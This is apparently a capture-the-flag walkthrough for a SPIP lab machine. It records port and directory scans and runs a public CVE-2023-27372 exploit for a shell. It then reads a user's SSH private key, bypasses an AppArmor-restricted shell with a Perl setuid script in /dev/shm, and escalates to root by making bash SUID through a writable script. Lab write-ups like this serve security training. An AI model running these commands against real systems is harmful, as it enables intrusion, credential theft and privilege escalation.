---
tags:
  - CVE
  - Apparmor
---

### Initial scan
```
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 20:0a:0d:20:ff:3b:91:46:6e:f6:47:79:5a:4c:63:da (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDIW5V/LhYFHpgyuyCZ3Yq2JEzjCPrIzNXWnPgtXXsl1i5FykFv6A2mMjoXGN9XttAF0NMjcefjAL/b0Z5mg/vZO4VgMlCF7iV51ey21qrGvCMiMLUYZDzCNbGrxGMcIJG+vA7IiMHhCl7PrNLPqSU4ug6QAgpjGtpNgbEKCCphGaoXX35bflycsUfV9iobh1BWGOLNYZPIxeQ6uTXZtFbQ9vGHG0N++IxIjELL4sDthsEelMs6nz+WS6vhv6YEueKUx44wL/z5V53figeEQz273Wx9mDE3e9EtlJ3+COm2t2q9RpdMm3+eWNQRZ5gp7hu48WjWrG59WfS+pAKcdRbCzyrPsV7w+a/UL5LdU7M48gvl3DEES8cYyJorJguchiHeVLBHiVl8zKn4+n+12w7wALQ1EXpd1nSh2xr43PH9jNuL5gIUG8mxThU64t9gDsiEVwJY5RcaC9HF4QxZvp21pgY3liLFcNJe6Qx4tvjWA+EsipvGARV5dKPvAfni1kE=
|   256 b3:29:5b:21:28:49:19:2a:b5:df:0e:29:e9:79:cb:7a (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBigLL2Iaqg3uwe45+vVk3X+L+nEfGti7PD5GOuuNlb2XoREiALEK5rgakBVQdlmkL/z2lS1F5zk3Dcmw3jmcNg=
|   256 45:19:4f:1e:37:8c:86:34:53:d1:b8:8e:fb:88:25:19 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ/GWeRSJRBRxhipW3iUPqIq/en0QHaPKqJdmFZOfXhq
80/tcp open  http    syn-ack ttl 60 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Publisher's Pulse: SPIP Insights & Tips
| http-methods:
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

### Web application scan
#### directroy fuzzing
```
ffuf -w /snap/seclists/current/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
-u "http://10.10.147.63/FUZZ"  -ic 
images                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 4197ms]
spip                    [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 587ms]
```

While looking at the app, i found this url. Which is look like LFI.
```
http://10.10.147.63/spip/spip.php?page=recherche&recherche=asdf
```

Doing another fuzzing on the pages
```
ffuf -w /snap/seclists/current/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
-u "http://10.10.147.63/spip/spip.php?page=FUZZ&recherche=asdf"  -ic

contact                 [Status: 200, Size: 7473, Words: 431, Lines: 176, Duration: 669ms]
login                   [Status: 200, Size: 12197, Words: 657, Lines: 367, Duration: 631ms]
backend                 [Status: 200, Size: 6203, Words: 603, Lines: 76, Duration: 621ms]
plan                    [Status: 200, Size: 5714, Words: 358, Lines: 140, Duration: 676ms]
sommaire                [Status: 200, Size: 8268, Words: 448, Lines: 186, Duration: 623ms]
recherche               [Status: 200, Size: 5695, Words: 347, Lines: 151, Duration: 545ms]
ical                    [Status: 200, Size: 502, Words: 20, Lines: 19, Duration: 710ms]

```

#### I found we have vuln like CVE.
```sh
 git clone https://github.com/0SPwn/CVE-2023-27372-POC.git
python3 exploit.py -u http://10.10.153.212/spip/spip.php
```

Then you got shell in the system.

### Read private key .ssh
```sh
cat /home/think/.ssh/id_rsa
```

Doing ssh 
```sh
ssh -i think@IP
```

---



when we got inside we found we can't even write in our own home directory which mean we are in restricted shell. we tried to run `env`, we found custom shell which mean 100% we are in restricted shell, using `apparmor`.
```sh
env
SHELL=/usr/sbin/ash
```

Running linpeas, we found `SID` but we can't run it becasue we are in restricted shell. 
```
-rwsr-sr-x 1 root root 17K Nov 14  2023 /usr/sbin/run_container (Unknown SUID binary!)
```

Look at what we are able to do:
```sh
cat /etc/apparmor.d/usr.sbin.ash

#include <tunables/global>

/usr/sbin/ash flags=(complain) {
  #include <abstractions/base>
  #include <abstractions/bash>
  #include <abstractions/consoles>
  #include <abstractions/nameservice>
  #include <abstractions/user-tmp>

  # Remove specific file path rules
  # Deny access to certain directories
  deny /opt/ r,
  deny /opt/** w,
  deny /tmp/** w,
  deny /dev/shm w,
  deny /var/tmp w,
  deny /home/** w,
  /usr/bin/** mrix,
  /usr/sbin/** mrix,

  # Simplified rule for accessing /home directory
  owner /home/** rix,
}
```


> [!bug] 
> Here it complain not **enforce**, so we can write in **/dev/shm**.


Looking at [[Apparmor]] we find we may be able to bypass the restricted shell.
```
echo '#!/usr/bin/perl
use POSIX qw(strftime);
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh"' > /dev/shm/test.pl
chmod +x /dev/shm/test.pl
/dev/shm/test.pl
```

Then we found we can run  `run_container` and found it call another script that we can edit `/opt/run_container`.
```
echo 'chmod +s $(which bash)' > /dev/shm/pwn.sh  
chmod +x /dev/shm/pwn.sh
/dev/shm/pwn.sh
```
GG